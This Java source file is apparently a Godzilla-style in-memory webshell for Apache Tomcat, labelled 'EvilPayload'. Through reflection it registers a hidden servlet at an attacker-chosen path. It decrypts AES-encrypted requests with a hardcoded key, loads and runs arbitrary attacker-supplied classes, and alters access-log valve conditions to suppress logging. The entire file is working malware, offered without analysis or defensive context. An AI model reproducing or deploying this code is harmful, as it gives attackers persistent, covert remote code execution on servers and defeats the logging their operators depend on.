package x;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;
import javax.servlet.jsp.SkipPageException;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

/**
 * @className EvilPayload
 * @Description TODO
 * @Author sunnylast0
 * @Date 2020/10/19 0:28
 * @Version 1.0
 **/
public class GodzillaDemoServlet extends ClassLoader implements Servlet {
    private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();
    private String pwd;
    private String path;
    private ServletConfig servletConfig;
    String xc = "3c6e0b8a9c15224a";
    String md5 = "";

    public GodzillaDemoServlet() {

    }


    public void init(ServletConfig paramServletConfig) throws ServletException {
        this.servletConfig = paramServletConfig;
    }

    public ServletConfig getServletConfig() {
        return this.servletConfig;
    }

    // init
    @Override
    public boolean equals(Object conreq) {
        Request request = (Request) conreq;
        Response response = request.getResponse();
        try {
            this.pwd = request.getParameter("p");
            this.path = request.getParameter("path");
            ServletContext servletContext = request.getServletContext();
            if (this.pwd != null && this.path != null && servletContext != null) {
                md5 = md5(this.pwd + xc);
                dynamicAddServlet(servletContext);
                response.getWriter().write("dynamic inject success");
                response.getWriter().flush();
                response.getWriter().close();
            } else {
                response.getWriter().write("dynamic inject Fail");
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Exception e) {
            try {
                StackTraceElement[] stackTraceElementArray = e.getStackTrace();
                StringBuffer sb = new StringBuffer();
                for (StackTraceElement stackTraceElement : stackTraceElementArray) {
                    sb.append(stackTraceElement.toString()).append("\n");
                }
                response.getWriter().write(sb.toString());
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException ioException) {
                ;
            }
        }
        return true;
    }

    public Class Q(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public void service(ServletRequest arg0, ServletResponse arg1) throws ServletException, IOException {
        HttpServletRequest request;
        HttpServletResponse response;
        try {
            request = (HttpServletRequest) arg0;
            response = (HttpServletResponse) arg1;
        } catch (ClassCastException var6) {
            throw new ServletException("non-HTTP request or response");
        }

        this._jspService(request, response);
    }

    private void noLog(PageContext pc) {
        try {
            Object applicationContext = getFieldValue(pc.getServletContext(), "context");
            Object container = getFieldValue(applicationContext, "context");

            ArrayList arrayList;
            for (arrayList = new ArrayList(); container != null; container = this.invoke(container, "getParent", (Object[]) null)) {
                arrayList.add(container);
            }

            label51:
            for (int i = 0; i < arrayList.size(); ++i) {
                try {
                    Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[]) null);
                    if (pipeline != null) {
                        Object valve = this.invoke(pipeline, "getFirst", (Object[]) null);

                        while (true) {
                            while (true) {
                                if (valve == null) {
                                    continue label51;
                                }

                                if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[]) null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                                    String condition = (String) this.invoke(valve, "getCondition");
                                    condition = condition == null ? "FuckLog" : condition;
                                    this.invoke(valve, "setCondition", condition);
                                    pc.getRequest().setAttribute(condition, condition);
                                    valve = this.invoke(valve, "getNext", (Object[]) null);
                                } else if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                    valve = this.invoke(valve, "getNext", (Object[]) null);
                                } else {
                                    valve = null;
                                }
                            }
                        }
                    }
                } catch (Exception var9) {
                }
            }
        } catch (Exception var10) {
        }

    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                value = value.replace("\n", "").replace("\r", "");
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public void _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;

        try {
            response.setContentType("text/html");
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String) null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
            out = pageContext.getOut();
            this.noLog(pageContext);
            try {
                byte[] data = base64Decode(request.getParameter(this.pwd));
                data = x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", new GodzillaDemoServlet(pageContext.getClass().getClassLoader()).Q(data));
                } else {
                    request.setAttribute("parameters", new String(data));
                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                    f.equals(pageContext);
                    response.getWriter().write(md5.substring(0, 16));
                    response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));
                    response.getWriter().write(md5.substring(16));
                }
            } catch (Exception e) {
            }
        } catch (Throwable var18) {
            if (!(var18 instanceof SkipPageException)) {
                out = (JspWriter) _jspx_out;
                if (_jspx_out != null && ((JspWriter) _jspx_out).getBufferSize() != 0) {
                    try {
                        if (response.isCommitted()) {
                            out.flush();
                        } else {
                            out.clearBuffer();
                        }

                        return;
                    } catch (IOException var17) {
                        return;
                    }
                }
            }

            return;
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }

    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public GodzillaDemoServlet(ClassLoader classLoader) {
        super(classLoader);
    }

    public void dynamicAddServlet(ServletContext servletContext) throws Exception {
        String wrapperName = this.path;

        // get standardContext
        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);

        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

        Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[]) null);
        this.invoke(newWrapper, "setName", wrapperName);
        setFieldValue(newWrapper, "instance", this);
        Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
        Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
        if (oldWrapper != null) {
            standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
        }

        standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);

        Method method;
        try {
            method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
        } catch (Exception var9) {
            method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
        }

        method.invoke(standardContext, path, wrapperName);

        this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[]) null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList) listenersField.get(containerBase);

        for (int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for (int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

                    for (int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[]) null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for (l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for (l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }

    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }
}
